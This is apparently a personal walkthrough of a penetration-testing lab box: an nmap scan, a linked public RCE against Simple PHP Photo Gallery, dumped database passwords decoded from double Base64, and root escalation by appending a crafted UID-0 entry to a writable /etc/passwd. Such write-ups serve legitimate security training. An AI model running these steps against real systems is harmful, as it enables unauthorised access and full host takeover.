`nmap -A -T4 -p- 192.168.148.58`

```
21/tcp    open  ftp         vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.244
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx      MySQL X protocol listener
```

# HTTP 
Simple PHP Photo Gallery v0.8 is listed. Doing a quick search for that gets us a [RCE](https://github.com/beauknowstech/SimplePHPGal-RCE.py) which we can get a shell.

![](Images/Pasted%20image%2020250503142601.png)

We can get the local flag yet so we will do some enumeration.

![](Images/Pasted%20image%2020250503143143.png)

We have found db credentials. Lets login with those

![](Images/Pasted%20image%2020250503143741.png)

In the users table is all of the usernames and passwords

![](Images/Pasted%20image%2020250503143831.png)

```
josh:VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=  
michael:U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==  
serena:VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==
```

These appear to be Base64, but they are double encoded.

```
josh:MobilizeHissSeedtime747
michael:HockSydneyCertify123
serena:OverallCrestLean000
```

Testing the credentials michael's login works.

![](Images/Pasted%20image%2020250503144347.png)

Rerun Linpeas with the new credentials. Found within the linpeas output is /etc/passwd is writeable. Lets create a new root user.

```
new-user:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash

echo "$(cat new_user_entry.txt)" >> /etc/passwd

cat /etc/passwd | grep new-user

su new-user pass123
```

![](Images/Pasted%20image%2020250503145150.png)